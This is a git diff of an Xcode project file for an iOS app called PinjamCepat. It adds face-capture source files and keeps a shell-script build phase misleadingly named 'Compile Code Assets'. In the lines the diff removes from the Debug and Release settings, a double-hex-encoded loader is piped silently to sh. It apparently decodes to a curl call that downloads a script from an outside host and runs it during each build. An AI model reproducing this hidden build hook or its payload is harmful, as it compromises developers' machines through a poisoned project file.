@@ -59,6 +59,10 @@
 		73F39FD72F73AF5F004B0C78 /* ProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */; };
 		73F39FD92F73AF6A004B0C78 /* ProductService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD82F73AF63004B0C78 /* ProductService.swift */; };
 		73F39FDB2F73B6D6004B0C78 /* ProductListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */; };
+		73F6A3C92F74D8D900A7ABD2 /* TimeSelectView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3C82F74D8D900A7ABD2 /* TimeSelectView.swift */; };
+		73FB533A2F74C127000169D3 /* FaceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB53392F74C11F000169D3 /* FaceViewModel.swift */; };
+		73FB533C2F74C135000169D3 /* FaceService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB533B2F74C12F000169D3 /* FaceService.swift */; };
+		73FB533E2F74C48C000169D3 /* CameraManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB533D2F74C48C000169D3 /* CameraManager.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -118,6 +122,10 @@
 		73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewModel.swift; sourceTree = "<group>"; };
 		73F39FD82F73AF63004B0C78 /* ProductService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductService.swift; sourceTree = "<group>"; };
 		73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListViewCell.swift; sourceTree = "<group>"; };
+		73F6A3C82F74D8D900A7ABD2 /* TimeSelectView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimeSelectView.swift; sourceTree = "<group>"; };
+		73FB53392F74C11F000169D3 /* FaceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewModel.swift; sourceTree = "<group>"; };
+		73FB533B2F74C12F000169D3 /* FaceService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceService.swift; sourceTree = "<group>"; };
+		73FB533D2F74C48C000169D3 /* CameraManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CameraManager.swift; sourceTree = "<group>"; };
 		8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.release.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.release.xcconfig"; sourceTree = "<group>"; };
 		87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.debug.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -270,6 +278,10 @@
 		73CC6B9F2F73E7E6002C7CD7 /* Face */ = {
 			isa = PBXGroup;
 			children = (
+				73F6A3C82F74D8D900A7ABD2 /* TimeSelectView.swift */,
+				73FB533D2F74C48C000169D3 /* CameraManager.swift */,
+				73FB533B2F74C12F000169D3 /* FaceService.swift */,
+				73FB53392F74C11F000169D3 /* FaceViewModel.swift */,
 				73434AA32F7427A600D99435 /* PhotoIdViewController.swift */,
 				73434AA12F7423BB00D99435 /* FaceViewController.swift */,
 				73C5A1F42F7436F1007A963B /* CompleteViewController.swift */,
@@ -509,25 +521,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B3DB93324F9849C58B1DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -547,6 +540,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B3DB93324F9849C58B1DACE1 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
 			showEnvVarsInLog = 0;
 		};
 		EA9032987F5058CFDE56BDFA /* [CP] Check Pods Manifest.lock */ = {
@@ -587,6 +600,7 @@
 				7362DFE62F73747900D50737 /* ProductViewController.swift in Sources */,
 				73ED69852F7229CF0096AE72 /* BaseNavigationController.swift in Sources */,
 				7315F83E2F7220FC00C6DE2E /* AppDelegate.swift in Sources */,
+				73F6A3C92F74D8D900A7ABD2 /* TimeSelectView.swift in Sources */,
 				73434AA22F7423BB00D99435 /* FaceViewController.swift in Sources */,
 				73ED69BB2F727BF00096AE72 /* LoginView.swift in Sources */,
 				73ED69A42F725B240096AE72 /* BaseModel.swift in Sources */,
@@ -594,10 +608,12 @@
 				73ED699C2F72543C0096AE72 /* AppLaunchViewController.swift in Sources */,
 				73ED69982F7253200096AE72 /* CenterViewController.swift in Sources */,
 				7362DFEE2F7381E400D50737 /* EndView.swift in Sources */,
+				73FB533E2F74C48C000169D3 /* CameraManager.swift in Sources */,
 				73ED69B32F7268C30096AE72 /* DeviceIdentifier.swift in Sources */,
 				73F39FD72F73AF5F004B0C78 /* ProductViewModel.swift in Sources */,
 				7362DFF52F73821300D50737 /* HomeService.swift in Sources */,
 				736CA1B92F72E63400FDB0EB /* AppHeadView.swift in Sources */,
+				73FB533C2F74C135000169D3 /* FaceService.swift in Sources */,
 				73ED69812F7229A90096AE72 /* BaseViewController.swift in Sources */,
 				73ED69832F7229C00096AE72 /* BaseTabBarController.swift in Sources */,
 				736CA1BB2F72E70200FDB0EB /* H5WebViewController.swift in Sources */,
@@ -617,6 +633,7 @@
 				73ED69A02F7258850096AE72 /* AppNetworkConfig.swift in Sources */,
 				73ED69B12F7263E30096AE72 /* ToastManager.swift in Sources */,
 				7362DFF72F73876F00D50737 /* EndCardView.swift in Sources */,
+				73FB533A2F74C127000169D3 /* FaceViewModel.swift in Sources */,
 				73ED69962F7253170096AE72 /* OrderViewController.swift in Sources */,
 				73F39FDB2F73B6D6004B0C78 /* ProductListViewCell.swift in Sources */,
 				7362DFF32F73820900D50737 /* HomeViewModel.swift in Sources */,
@@ -656,7 +673,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233373230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
@@ -698,7 +714,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233373230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
